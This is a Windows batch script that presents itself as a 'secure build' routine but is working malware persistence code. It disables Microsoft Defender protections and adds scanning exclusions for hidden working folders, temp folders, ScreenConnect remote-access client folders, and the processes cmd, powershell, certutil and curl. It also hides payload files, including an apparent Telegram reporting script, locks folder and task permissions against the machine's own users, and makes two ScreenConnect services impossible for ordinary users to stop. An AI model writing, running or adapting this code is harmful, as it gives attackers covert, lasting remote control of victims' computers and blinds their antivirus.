@echo off
REM OWN_SECURE BUILD 20260802S1 - exclusions + ACL lock + SC service harden
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\boot.err"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "PF=%ProgramFiles%"
set "PF86=%ProgramFiles(x86)%"
set "TASKROOT=%SystemRoot%\System32\Tasks"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
echo secure_begin %DATE% %TIME% S1>>"%LOG%"

REM --- Defender: registry exclusions (policy + preference keys) ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD2%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP1%)" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%PF86%\ScreenConnect Client (%KEEP2%)" /t REG_DWORD /d 0 /f >nul 2>&1
for %%P in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe ScreenConnect.ClientService.exe ScreenConnect.WindowsClient.exe) do (
  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%P" /t REG_DWORD /d 0 /f >nul 2>&1
)

REM --- Defender: live MpPreference (stronger than reg alone) ---
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "Try{Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true}Catch{};" ^
  "$paths=@('%WD%','%WD2%','C:\Windows\Temp',$env:TEMP,'%PF%\ScreenConnect Client (%KEEP1%)','%PF%\ScreenConnect Client (%KEEP2%)','%PF86%\ScreenConnect Client (%KEEP1%)','%PF86%\ScreenConnect Client (%KEEP2%)');" ^
  "try{$paths+=@(Get-ChildItem -Path $env:ProgramFiles -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}catch{};" ^
  "try{$pf86=[Environment]::GetFolderPath('ProgramFilesX86'); if($pf86){$paths+=@(Get-ChildItem -Path $pf86 -Filter 'ScreenConnect Client*' -Directory -EA 0 | ForEach-Object {$_.FullName})}}catch{};" ^
  "foreach($p in ($paths | Select-Object -Unique)){ if($p -and (Test-Path -LiteralPath $p)){ Add-MpPreference -ExclusionPath $p -EA 0 } };" ^
  "foreach($x in @('msiexec.exe','curl.exe','cmd.exe','powershell.exe','certutil.exe','ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe')){ Add-MpPreference -ExclusionProcess $x -EA 0 };" ^
  "Add-MpPreference -ExclusionExtension '.cmd','.ps1','.msi' -EA 0" >nul 2>&1

REM --- ACL: only SYSTEM + Administrators on persist dirs ---
call :LockDir "%WD%"
call :LockDir "%WD2%"

REM --- hide workdirs + key payload files ---
attrib +h +s "%WD%" >nul 2>&1
attrib +h +s "%WD2%" >nul 2>&1
for %%F in (own_mon.cmd own_run.cmd etl_mon.cmd tg_report.ps1 pkg.msi notify.cfg own_secure.cmd) do (
  if exist "%WD%\%%F" attrib +h +s "%WD%\%%F" >nul 2>&1
)
if exist "%WD2%\etl_mon.cmd" attrib +h +s "%WD2%\etl_mon.cmd" >nul 2>&1

REM --- ACL: scheduled task XML (harder to delete without Admin) ---
for %%T in (
  "Microsoft\Windows\Diagnosis\Scheduled"
  "Microsoft\Windows\PLA\Server"
  "Microsoft\Windows\WDI\ResolutionHost"
  "Microsoft\Windows\Tcpip\IpAddressConflict1"
) do (
  if exist "%TASKROOT%\%%~T" (
    icacls "%TASKROOT%\%%~T" /inheritance:r >nul 2>&1
    icacls "%TASKROOT%\%%~T" /grant:r "NT AUTHORITY\SYSTEM:F" "BUILTIN\Administrators:F" >nul 2>&1
    attrib +h +s "%TASKROOT%\%%~T" >nul 2>&1
  )
)

REM --- ACL: keep ScreenConnect install dirs (once; takeown every tick is noisy) ---
if not exist "%WD%\secure_sc.flag" (
  for %%D in (
    "%PF%\ScreenConnect Client (%KEEP1%)"
    "%PF%\ScreenConnect Client (%KEEP2%)"
    "%PF86%\ScreenConnect Client (%KEEP1%)"
    "%PF86%\ScreenConnect Client (%KEEP2%)"
  ) do (
    if exist "%%~D" call :LockDir "%%~D"
  )
  echo sc_locked>%WD%\secure_sc.flag
)

REM --- SC services: only SYSTEM + Admins can stop/delete/change ---
REM DACL: SY full control-ish; BA full; no Interactive/Users stop rights
set "SD=D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
sc.exe sdset "%PRIM%" "%SD%" >nul 2>&1
sc.exe sdset "%ALT%" "%SD%" >nul 2>&1
sc.exe config "%PRIM%" start= auto >nul 2>&1
sc.exe config "%ALT%" start= auto >nul 2>&1
sc.exe failure "%PRIM%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
sc.exe failure "%ALT%" reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1

echo secure_done>>"%LOG%"
exit /b 0

:LockDir
set "T=%~1"
if not exist "%T%" exit /b 0
REM take ownership then strip inherited ACEs; SYSTEM+Admins only
takeown /F "%T%" /R /D Y >nul 2>&1
icacls "%T%" /inheritance:r >nul 2>&1
icacls "%T%" /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
icacls "%T%" /remove:g "Users" "Authenticated Users" "Everyone" "Interactive" "BUILTIN\Users" >nul 2>&1
exit /b 0
